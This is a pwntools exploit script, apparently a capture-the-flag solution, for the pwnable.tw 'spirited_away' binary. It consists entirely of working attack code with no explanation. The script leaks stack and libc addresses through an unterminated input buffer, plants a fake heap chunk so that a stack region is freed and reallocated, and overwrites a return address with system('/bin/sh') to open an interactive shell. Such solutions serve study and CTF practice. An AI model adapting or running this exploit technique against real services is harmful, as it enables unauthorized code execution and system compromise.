from pwn import *
r = process("./spirited_away")
#r = remote("chall.pwnable.tw", 10204)
def leave_comment(name, age, reason, comment):
    r.recvuntil("Please enter your name: ")
    r.send(name)
    r.recvuntil("Please enter your age: ")
    r.sendline(age)
    r.recvuntil("Why did you came to see this movie? ")
    r.send(reason)
    r.recvuntil("Please enter your comment: ")
    r.send(comment)

def _leave_comment(age, reason):
    r.recvuntil("Please enter your age: ")
    r.sendline(age)
    r.recvuntil("Why did you came to see this movie? ")
    r.send(reason)

leave_comment("1", "1", "1", "1")
for x in range(0, 9):
    r.recvuntil("Would you like to leave another comment? <y/n>: ")
    r.send("y")
    leave_comment("aaa", "11", "ccc", "ddd")

for x in range(9, 98):
    r.recvuntil("Would you like to leave another comment? <y/n>: ")
    r.send("y")
    _leave_comment("11", "cc")

r.recvuntil("Would you like to leave another comment? <y/n>: ")
r.send("y")
_leave_comment("11", "c"*0x38)
r.recvuntil("Reason: ")
r.recv(0x38)
ret = r.recv(4)
comment = u32(ret)
print hex(comment)
comment_ptr = comment - 0xc8
print hex(comment_ptr)

fake_chunk_addr = comment_ptr + 80 + 8 + 8
print hex(fake_chunk_addr)

r.recvuntil("Would you like to leave another comment? <y/n>: ")
r.send("y")

leave_comment("aa","11", "c"*0x3c,"dd")

r.recvuntil("Reason: ")
print r.recv(0x3c)
libc_leak = u32(r.recv(4))
print hex(libc_leak)

reason = p32(0) + p32(0x41) + 0x38 * "\x00" + p32(0) + p32(0x41)
comment = "A"*80 + p32(0x80) + p32(fake_chunk_addr)

r.recvuntil("Would you like to leave another comment? <y/n>: ")
r.send("y")
leave_comment("a", "11", reason, comment)


r.recvuntil("Would you like to leave another comment? <y/n>: ")
r.send("y")

libc_main = libc_leak - 0x1f6010
system = libc_main + 0x3a940
binsh = libc_main + 0x158e8b

print hex(system)
print hex(binsh)
exp = "a"*0x4c + p32(system) + "aaaa" + p32(binsh)

leave_comment(exp, "11", "aa", "aa")
gdb.attach(r)
r.recvuntil("Would you like to leave another comment? <y/n>: ")
r.send("n")
r.recvuntil("Bye!\n")

r.interactive()
